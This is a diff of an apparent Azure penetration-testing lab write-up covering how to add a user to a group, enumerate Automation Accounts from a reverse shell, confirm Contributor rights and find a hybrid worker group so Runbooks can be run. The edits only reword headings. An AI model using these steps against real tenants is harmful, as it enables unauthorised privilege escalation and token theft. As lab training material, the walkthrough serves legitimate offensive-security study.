@@ -682,7 +682,7 @@ New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParame
 ```
 Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
 ```
-#### back on shell steal both tokens to enum resources
+#### Enumerate resources i.e., Automation Account
 - Now moving back to the shell, and having added Mark to the group, we should be able to enum resources i.e., Automation Accounts
 - Now, we can use az cli to check for automation accounts. Run the below command on the reverse shell:
 ```az automation account list```
@@ -711,7 +711,8 @@ Run the below command to get the role for Mark (added to the Aumtation Accounts 
 PS C:\AzAD\Tools> Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
 ```
 
-- Sweet! The above output means Mark has Contributor role on the automation account. We can create and execute Runbooks!
+- Sweet! The above output means Mark has Contributor role on the automation account.
+- This means we can create and execute Runbooks!
 - Use the below command to check if a hybrid worker group is in use by the automation account:
 ```
 PS C:\AzAD\Tools> Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
